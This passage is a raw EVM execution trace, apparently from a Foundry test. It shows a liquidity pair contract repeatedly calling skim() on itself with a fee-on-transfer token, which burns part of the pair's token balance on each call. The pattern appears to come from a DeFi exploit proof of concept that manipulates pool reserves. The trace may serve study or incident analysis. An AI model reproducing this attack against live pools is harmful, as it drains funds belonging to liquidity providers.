    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2480036802297680441421051 [2.48e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 756114879689909472125955 [7.561e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 22683446390697284163778 [2.268e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 680503391720918524913360 [6.805e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2457353355906983157257273 [2.457e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 733431433299212187962177 [7.334e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 22002942998976365638865 [2.2e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 660088289969290969165960 [6.6e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2435350412908006791618408 [2.435e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 711428490300235822323312 [7.114e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 21342854709007074669699 [2.134e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 640285641270212240090981 [6.402e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2414007558198999716948709 [2.414e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 690085635591228747653613 [6.9e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 20702569067736862429608 [2.07e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 621077072032105872888252 [6.21e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2393304989131262854519101 [2.393e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 669383066523491885224005 [6.693e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 20081491995704756556720 [2.008e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 602444759871142696701605 [6.024e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2373223497135558097962381 [2.373e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 649301574527787128667285 [6.493e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 19479047235833613860018 [1.947e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 584371417075008415800557 [5.843e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2353744449899724484102363 [2.353e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 629822527291953514807267 [6.298e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 18894675818758605444218 [1.889e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 566840274562758163326541 [5.668e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2334849774080965878658145 [2.334e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 610927851473194909363049 [6.109e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 18327835544195847280891 [1.832e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 549835066325875418426745 [5.498e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2316521938536770031377254 [2.316e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 592600015928999062082158 [5.926e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 17778000477869971862464 [1.777e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 533340014336099155873943 [5.333e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2298743938058900059514790 [2.298e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 574822015451129090219694 [5.748e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 17244660463533872706590 [1.724e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 517339813906016181197725 [5.173e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2281499277595366186808200 [2.281e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 557577354987595217513104 [5.575e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 16727320649627856525393 [1.672e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 501819619488835695761794 [5.018e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2264771956945738330282807 [2.264e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 540850034337967360987711 [5.408e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 16225501030139020829631 [1.622e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 486765030904170624888940 [4.867e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2248546455915599309453176 [2.248e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 524624533307828340158080 [5.246e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 15738735999234850204742 [1.573e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 472162079977045506142272 [4.721e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2232807719916364459248434 [2.232e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 508885797308593489953338 [5.088e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 15266573919257804698600 [1.526e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 457997217577734140958005 [4.579e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2217541145997106654549834 [2.217e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 493619223389335685254738 [4.936e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 14808576701680070557642 [1.48e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 444257301050402116729265 [4.442e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2202732569295426583992192 [2.202e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 478810646687655614697096 [4.788e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 14364319400629668440912 [1.436e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 430929582018890053227387 [4.309e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2188368249894796915551280 [2.188e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 464446327287025946256184 [4.644e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 13933389818610778387685 [1.393e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 418001694558323351630566 [4.18e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
